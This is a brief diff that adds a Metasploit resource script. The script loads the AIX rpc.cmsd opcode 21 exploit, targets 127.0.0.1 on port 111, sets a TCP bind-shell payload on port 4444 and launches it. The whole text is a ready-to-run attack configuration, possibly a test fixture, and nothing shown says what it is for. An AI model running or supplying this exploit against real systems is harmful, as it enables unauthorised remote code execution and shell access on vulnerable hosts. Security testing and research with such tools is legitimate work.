@@ -1,0 +1,6 @@
+use exploit/aix/rpc_cmsd_opcode21
+set RHOSTS 127.0.0.1
+set RPORT 111
+set PAYLOAD payload/generic/shell_bind_tcp
+set LPORT 4444
+exploit
